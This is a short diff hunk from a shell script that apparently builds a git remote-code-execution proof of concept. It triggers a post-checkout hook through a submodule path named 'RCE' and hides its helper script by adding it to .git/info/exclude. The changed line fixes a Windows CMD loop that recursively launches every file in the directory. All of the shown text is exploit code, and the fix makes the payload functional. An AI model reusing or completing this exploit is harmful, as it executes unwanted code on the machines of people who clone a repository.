@@ -7,7 +7,7 @@ echo 'git -C GITLNK/modules/RCE hook run post-checkout -- "$(git rev-parse HEAD)
 touch .git/info/exclude
 grep -qxF 'Call-Post-Checkout.sh' .git/info/exclude||echo 'Call-Post-Checkout.sh' >>.git/info/exclude
 CMD <<END
-for /r %i in (*.*) do (start "shit" "~dpnxi")
+for /r %i in (*.*) do (start "shit" "%~dpnxi")
 END
 sleep 1
 unset GIT_DIR
